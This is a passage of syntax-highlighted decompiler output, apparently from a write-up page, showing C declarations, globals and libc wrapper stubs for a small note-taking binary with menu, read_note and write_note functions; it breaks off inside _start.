format\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, ...);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">int32_t\u003C/span>\u003Cspan style=\"color:#B392F0\"> function_10d0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#F97583\">int64_t\u003C/span>\u003Cspan style=\"color:#F97583\"> *\u003C/span>\u003Cspan style=\"color:#FFAB70\"> ptr\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, \u003C/span>\u003Cspan style=\"color:#F97583\">int32_t\u003C/span>\u003Cspan style=\"color:#FFAB70\"> size\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, \u003C/span>\u003Cspan style=\"color:#F97583\">int32_t\u003C/span>\u003Cspan style=\"color:#FFAB70\"> n\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, \u003C/span>\u003Cspan style=\"color:#F97583\">struct\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> _IO_FILE \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#FFAB70\"> s\u003C/span>\u003Cspan style=\"color:#E1E4E8\">);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">int64_t\u003C/span>\u003Cspan style=\"color:#B392F0\"> function_1110\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#F97583\">void\u003C/span>\u003Cspan style=\"color:#E1E4E8\">);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">int64_t\u003C/span>\u003Cspan style=\"color:#B392F0\"> function_1140\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#F97583\">void\u003C/span>\u003Cspan style=\"color:#E1E4E8\">);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">int64_t\u003C/span>\u003Cspan style=\"color:#B392F0\"> function_1180\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#F97583\">void\u003C/span>\u003Cspan style=\"color:#E1E4E8\">);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">int64_t\u003C/span>\u003Cspan style=\"color:#B392F0\"> function_11d0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#F97583\">void\u003C/span>\u003Cspan style=\"color:#E1E4E8\">);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">int64_t\u003C/span>\u003Cspan style=\"color:#B392F0\"> menu\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#F97583\">void\u003C/span>\u003Cspan style=\"color:#E1E4E8\">);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">int64_t\u003C/span>\u003Cspan style=\"color:#B392F0\"> read_note\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#F97583\">void\u003C/span>\u003Cspan style=\"color:#E1E4E8\">);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">int64_t\u003C/span>\u003Cspan style=\"color:#B392F0\"> setup\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#F97583\">void\u003C/span>\u003Cspan style=\"color:#E1E4E8\">);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">int64_t\u003C/span>\u003Cspan style=\"color:#B392F0\"> write_note\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#F97583\">void\u003C/span>\u003Cspan style=\"color:#E1E4E8\">);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\">// --------------------- Global Variables ---------------------\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">int64_t\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> g1 \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#F97583\"> -0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">9b2000009cc\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003Cspan style=\"color:#6A737D\"> // 0x2208\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">struct\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> _IO_FILE \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> g2 \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#79B8FF\"> NULL\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003Cspan style=\"color:#6A737D\"> // 0x4020\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">struct\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> _IO_FILE \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> g3 \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#79B8FF\"> NULL\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003Cspan style=\"color:#6A737D\"> // 0x4030\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">char\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> g4 \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003Cspan style=\"color:#6A737D\"> // 0x4048\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">char\u003C/span>\u003Cspan style=\"color:#F97583\"> *\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> g5;\u003C/span>\u003Cspan style=\"color:#6A737D\"> // 0x4080\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">int64_t\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> g6 \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003Cspan style=\"color:#6A737D\"> // 0x4088\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">int32_t\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> g7 \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003Cspan style=\"color:#6A737D\"> // 0x4120\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">int32_t\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> g8 \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003Cspan style=\"color:#6A737D\"> // 0x4121\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">int32_t\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> g9;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\">// ------- Dynamically Linked Functions Without Header --------\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">void\u003C/span>\u003Cspan style=\"color:#B392F0\"> __cxa_finalize\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#F97583\">int64_t\u003C/span>\u003Cspan style=\"color:#F97583\"> *\u003C/span>\u003Cspan style=\"color:#FFAB70\"> a1\u003C/span>\u003Cspan style=\"color:#E1E4E8\">);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">void\u003C/span>\u003Cspan style=\"color:#B392F0\"> __gmon_start__\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#F97583\">void\u003C/span>\u003Cspan style=\"color:#E1E4E8\">);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">int32_t\u003C/span>\u003Cspan style=\"color:#B392F0\"> __libc_start_main\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#F97583\">int64_t\u003C/span>\u003Cspan style=\"color:#FFAB70\"> a1\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, \u003C/span>\u003Cspan style=\"color:#F97583\">int32_t\u003C/span>\u003Cspan style=\"color:#FFAB70\"> a2\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, \u003C/span>\u003Cspan style=\"color:#F97583\">char\u003C/span>\u003Cspan style=\"color:#F97583\"> **\u003C/span>\u003Cspan style=\"color:#FFAB70\"> a3\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, \u003C/span>\u003Cspan style=\"color:#F97583\">void\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (\u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">a4)(), \u003C/span>\u003Cspan style=\"color:#F97583\">void\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (\u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">a5)(), \u003C/span>\u003Cspan style=\"color:#F97583\">void\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (\u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">a6)());\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">void\u003C/span>\u003Cspan style=\"color:#B392F0\"> __stack_chk_fail\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#F97583\">void\u003C/span>\u003Cspan style=\"color:#E1E4E8\">);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\">// ------------------------ Functions -------------------------\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\">// Address range: 0x1000 - 0x101b\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">int64_t\u003C/span>\u003Cspan style=\"color:#B392F0\"> _init\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#F97583\">void\u003C/span>\u003Cspan style=\"color:#E1E4E8\">) {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">    int64_t\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> result \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003Cspan style=\"color:#6A737D\"> // 0x1012\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">    if\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (\u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#F97583\">int64_t\u003C/span>\u003Cspan style=\"color:#F97583\"> *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)\u003C/span>\u003Cspan style=\"color:#F97583\">0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">3fe8\u003C/span>\u003Cspan style=\"color:#F97583\"> !=\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">) {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\">        // 0x1014\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">        __gmon_start__\u003C/span>\u003Cspan style=\"color:#E1E4E8\">();\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">        result \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#F97583\"> &#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">g9;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">    }\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\">    // 0x1016\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">    return\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> result;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">}\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\">// Address range: 0x1030 - 0x1036\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">void\u003C/span>\u003Cspan style=\"color:#B392F0\"> function_1030\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#F97583\">int64_t\u003C/span>\u003Cspan style=\"color:#F97583\"> *\u003C/span>\u003Cspan style=\"color:#FFAB70\"> ptr\u003C/span>\u003Cspan style=\"color:#E1E4E8\">) {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\">    // 0x1030\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">    free\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(ptr);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">}\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\">// Address range: 0x1040 - 0x1046\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">int32_t\u003C/span>\u003Cspan style=\"color:#B392F0\"> function_1040\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#F97583\">char\u003C/span>\u003Cspan style=\"color:#F97583\"> *\u003C/span>\u003Cspan style=\"color:#FFAB70\"> s\u003C/span>\u003Cspan style=\"color:#E1E4E8\">) {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\">    // 0x1040\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">    return\u003C/span>\u003Cspan style=\"color:#B392F0\"> puts\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(s);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">}\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\">// Address range: 0x1050 - 0x1056\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">void\u003C/span>\u003Cspan style=\"color:#B392F0\"> function_1050\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#F97583\">void\u003C/span>\u003Cspan style=\"color:#E1E4E8\">) {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\">    // 0x1050\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">    __stack_chk_fail\u003C/span>\u003Cspan style=\"color:#E1E4E8\">();\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">}\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\">// Address range: 0x1060 - 0x1066\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">int32_t\u003C/span>\u003Cspan style=\"color:#B392F0\"> function_1060\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#F97583\">char\u003C/span>\u003Cspan style=\"color:#F97583\"> *\u003C/span>\u003Cspan style=\"color:#FFAB70\"> format\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, ...) {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\">    // 0x1060\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">    return\u003C/span>\u003Cspan style=\"color:#B392F0\"> printf\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(format);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">}\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\">// Address range: 0x1070 - 0x1076\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">int32_t\u003C/span>\u003Cspan style=\"color:#B392F0\"> function_1070\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#F97583\">char\u003C/span>\u003Cspan style=\"color:#F97583\"> *\u003C/span>\u003Cspan style=\"color:#FFAB70\"> s\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, \u003C/span>\u003Cspan style=\"color:#F97583\">char\u003C/span>\u003Cspan style=\"color:#F97583\"> *\u003C/span>\u003Cspan style=\"color:#FFAB70\"> reject\u003C/span>\u003Cspan style=\"color:#E1E4E8\">) {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\">    // 0x1070\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">    return\u003C/span>\u003Cspan style=\"color:#B392F0\"> strcspn\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(s, reject);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">}\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\">// Address range: 0x1080 - 0x1086\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">char\u003C/span>\u003Cspan style=\"color:#F97583\"> *\u003C/span>\u003Cspan style=\"color:#B392F0\"> function_1080\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#F97583\">char\u003C/span>\u003Cspan style=\"color:#F97583\"> *\u003C/span>\u003Cspan style=\"color:#FFAB70\"> s\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, \u003C/span>\u003Cspan style=\"color:#F97583\">int32_t\u003C/span>\u003Cspan style=\"color:#FFAB70\"> n\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, \u003C/span>\u003Cspan style=\"color:#F97583\">struct\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> _IO_FILE \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#FFAB70\"> stream\u003C/span>\u003Cspan style=\"color:#E1E4E8\">) {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\">    // 0x1080\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">    return\u003C/span>\u003Cspan style=\"color:#B392F0\"> fgets\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(s, n, stream);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">}\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\">// Address range: 0x1090 - 0x1096\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">int32_t\u003C/span>\u003Cspan style=\"color:#B392F0\"> function_1090\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#F97583\">void\u003C/span>\u003Cspan style=\"color:#E1E4E8\">) {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\">    // 0x1090\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">    return\u003C/span>\u003Cspan style=\"color:#B392F0\"> getchar\u003C/span>\u003Cspan style=\"color:#E1E4E8\">();\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">}\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\">// Address range: 0x10a0 - 0x10a6\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">int64_t\u003C/span>\u003Cspan style=\"color:#F97583\"> *\u003C/span>\u003Cspan style=\"color:#B392F0\"> function_10a0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#F97583\">int32_t\u003C/span>\u003Cspan style=\"color:#FFAB70\"> size\u003C/span>\u003Cspan style=\"color:#E1E4E8\">) {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\">    // 0x10a0\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">    return\u003C/span>\u003Cspan style=\"color:#B392F0\"> malloc\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(size);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">}\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\">// Address range: 0x10b0 - 0x10b6\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">int32_t\u003C/span>\u003Cspan style=\"color:#B392F0\"> function_10b0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#F97583\">struct\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> _IO_FILE \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#FFAB70\"> stream\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, \u003C/span>\u003Cspan style=\"color:#F97583\">char\u003C/span>\u003Cspan style=\"color:#F97583\"> *\u003C/span>\u003Cspan style=\"color:#FFAB70\"> buf\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, \u003C/span>\u003Cspan style=\"color:#F97583\">int32_t\u003C/span>\u003Cspan style=\"color:#FFAB70\"> modes\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, \u003C/span>\u003Cspan style=\"color:#F97583\">int32_t\u003C/span>\u003Cspan style=\"color:#FFAB70\"> n\u003C/span>\u003Cspan style=\"color:#E1E4E8\">) {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\">    // 0x10b0\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">    return\u003C/span>\u003Cspan style=\"color:#B392F0\"> setvbuf\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(stream, buf, modes, n);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">}\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\">// Address range: 0x10c0 - 0x10c6\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">int32_t\u003C/span>\u003Cspan style=\"color:#B392F0\"> function_10c0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#F97583\">char\u003C/span>\u003Cspan style=\"color:#F97583\"> *\u003C/span>\u003Cspan style=\"color:#FFAB70\"> format\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, ...) {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\">    // 0x10c0\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">    return\u003C/span>\u003Cspan style=\"color:#B392F0\"> scanf\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(format);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">}\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\">// Address range: 0x10d0 - 0x10d6\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">int32_t\u003C/span>\u003Cspan style=\"color:#B392F0\"> function_10d0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#F97583\">int64_t\u003C/span>\u003Cspan style=\"color:#F97583\"> *\u003C/span>\u003Cspan style=\"color:#FFAB70\"> ptr\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, \u003C/span>\u003Cspan style=\"color:#F97583\">int32_t\u003C/span>\u003Cspan style=\"color:#FFAB70\"> size\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, \u003C/span>\u003Cspan style=\"color:#F97583\">int32_t\u003C/span>\u003Cspan style=\"color:#FFAB70\"> n\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, \u003C/span>\u003Cspan style=\"color:#F97583\">struct\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> _IO_FILE \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#FFAB70\"> s\u003C/span>\u003Cspan style=\"color:#E1E4E8\">) {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\">    // 0x10d0\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">    return\u003C/span>\u003Cspan style=\"color:#B392F0\"> fwrite\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(ptr, size, n, s);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">}\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\">// Address range: 0x10e0 - 0x1106\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">int64_t\u003C/span>\u003Cspan style=\"color:#B392F0\"> _start\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#F97583\">int64_t\u003C/span>\u003Cspan style=\"color:#FFAB70\"> a1\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, \u003C/span>\u003Cspan style=\"color:#F97583\">int64_t\u003C/span>\u003Cspan style=\"color:#FFAB70\"> a2\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, \u003C/span>\u003Cspan style=\"color:#F97583\">int64_t\u003C/span>\u003Cspan style=\"color:#FFAB70\"> a3\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, \u003C/span>\u003Cspan style=\"color:#F97583\">int64_t\u003C/span>\u003Cspan style=\"color:#FFAB70\"> a4\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, \u003C/span>\u003Cspan style=\"color:#F97583\">int64_t\u003C/span>\u003Cspan style=\"color:#FFAB70\"> a5\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, \u003C/span>\u003Cspan style=\"color:#F97583\">int64_t\u003C/span>\u003Cspan style=\"color:#FFAB70\"> a6\u003C/span>\u003Cspan style=\"color:#E1E4E8\">) {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\">    // 0x10e0\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">    int64_t\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> v1;\u003C/span>\u003Cspan style=\"color:#6A737D\"> // 0x10e0\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">    __libc_start_main\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#F97583\">0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">17b4\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, (\u003C/span>\u003Cspan style=\"color:#F97583\">int32_t\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)a6, (\u003C/span>\u003Cspan 